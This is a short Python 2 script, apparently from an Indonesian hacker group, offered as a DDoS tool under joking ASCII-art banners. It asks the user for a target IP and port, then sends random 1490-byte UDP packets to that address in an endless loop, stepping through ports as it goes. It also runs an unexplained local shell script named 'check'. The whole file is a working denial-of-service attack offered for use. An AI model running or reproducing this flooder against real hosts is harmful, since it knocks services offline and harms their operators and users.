#!/usr/bin/env python2


'''
# Please Don't Recode
# Tools Segampang ini,  mau lu recode?
# Biar Sederhana Tapi W usaha ^_^
'''

DDOS="""\033[1;37m

\033[92mAuthor :\033[1;38mStarFuckTak'-'
\033[1;33mgithub\033[1;34m: https://github.com/K0NT0L
\033[1;34mFrom : \033[1;31mSAD Cyber Team
"""

Start="""\033[1;33m
 __________
< Meong'-' >
 ----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\/\
                ||______|
                ||     ||
   \033[1;37mHekel \033[1;33mkok \033[1;34mDDos:v\033[0m
"""
import os,time,sys,socket,random
      
# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
os.system("sh check")
os.system("figlet DDOS")

print DDOS
print
print "Example : 192.168.1.254"
print "\033[1;30m"

ip = raw_input("IP Web : ")
print ("\033[92mDefault : 80,8080")
port = input("Port  :  ")

os.system("clear")
print Start
print
print "Waiting..."
time.sleep(5)
print "\033[1;37m"
print "\033[92m"
sent = 100
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 2
     port = port + 2
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
